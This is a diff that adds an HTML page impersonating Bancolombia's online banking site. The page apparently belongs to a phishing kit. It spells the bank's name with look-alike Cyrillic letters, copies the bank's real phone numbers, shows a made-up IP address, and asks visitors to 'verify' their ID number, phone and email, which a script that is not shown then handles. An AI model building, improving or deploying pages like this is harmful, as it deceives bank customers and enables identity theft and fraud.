@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ваncоlоmbiа Sucursal Virtal Personas</title>
+    <link rel="icon" href="assets/logos/logo.png">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/main.css">
+
+    <!-- FUNCTIONS -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+
+    <header>
+        <img class="header-logo" src="./assets/logos/logo.svg" alt="">
+        <h3 class="header-subtitle">Sucursal Virtual Personas</h3>
+        <p class="header-text-info">Fecha y hora actual: <span id="datetime"></span></p>
+    </header>
+
+    <main>
+        <div class="page-label">
+            <h3 class="page-label-title">Verifiquemos que eres tú</h3>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <div class="error d-none mt-2">
+            <img src="./assets/icons/error.jpg">
+            <div class="error--text">
+                <h3>Error</h3>
+                <h4>Los datos personales no coinciden. Inténtelo de nuevo.</h4>
+            </div>
+        </div>
+
+        <div class="card">
+
+            <div class="card-header">
+                <h3>Verificar tus datos personales</h3>
+            </div>
+
+            <div class="card-message">
+                <p>Ingresa los siguientes datos personales asociados a tu cuenta.</p>
+            </div>
+
+            <form id="form-data">
+                
+                <div class="form-label">
+                    <img class="icon-info" src="./assets/icons/info.jpg"><label>Documento de Identidad</label>
+                </div>
+                <input class="form-input-text icon-i-doc" id="cc" type="number" oninput="limitarDigitos(this, 11)">
+                
+                
+                <div class="form-label mt-2">
+                    <img class="icon-info" src="./assets/icons/info.jpg"><label>Número de teléfono</label>
+                </div>
+                <input class="form-input-text icon-i-tel" id="cel" type="text" type="number" min="1000000000" oninput="limitarDigitos(this, 10)" required>
+                
+                <div class="form-label mt-2">
+                    <img class="icon-info" src="./assets/icons/info.jpg"><label>Correo electrónico</label>
+                </div>
+                <input class="form-input-text icon-i-email" id="email" type="email" required>
+
+                <div class="one-btn-container">
+                    <button class="btn mt-4" type="submit">
+                        Continuar
+                    </button>  
+                </div>
+
+            </form>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <div class="header-publicity">
+            <img src="./assets/data_publicity.svg" style="width: 200px ; text-align: center;" alt="">
+            <p>¿No conoces la Sucursal Virtual Personas de Ваncоlоmbiа? Conoce más aquí</p>
+        </div>
+
+        <footer class="footer-telephones">
+            <div class="tels">
+                Sucursal Telefónica Ваncоlоmbiа: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510
+				90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+				Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345.
+				Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.</div>
+			<div class="footer-ip">
+				<span>Dirección IP: <span id="ip">186.192.168.249</span></span>
+				<span>Copyright © 2023 Ваncоlоmbiа S.A.</span>
+			</div>
+        </footer>
+    </main>
+    
+
+
+
+
+
+    <!-- JS -->
+    <script src="./js/personaldata.js"></script>
+</body>
+</html>
